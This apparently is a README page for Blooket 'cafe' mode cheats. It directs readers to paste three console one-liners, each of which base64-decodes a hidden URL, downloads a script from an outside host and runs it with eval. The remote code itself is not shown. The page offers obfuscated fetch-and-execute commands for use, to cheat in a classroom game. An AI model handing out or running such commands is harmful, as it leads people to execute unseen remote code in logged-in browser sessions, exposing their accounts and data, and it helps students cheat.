**Discord server: https://discord.gg/K5xUbuDqmG**

**These bookmarklets are also on: https://schoolcheats.net/blooket**

# cafe

This cheat only works in cafe game mode!

# getCoins.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NhZmVHZXRDb2lucy5qcw==')).then((res) => res.text().then((t) => eval(t)))
```

# infiniteFoodLevel.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NhZmVJbmZpbml0ZUZvb2RMZXZlbC5qcw==')).then((res) => res.text().then((t) => eval(t)))
```

# stockInfiniteFood.js

Open console (ctrl + shift + j) and paste the following:
```js
fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjE0L2NhZmVTdG9ja0luZmluaXRlRm9vZC5qcw==')).then((res) => res.text().then((t) => eval(t)))
```
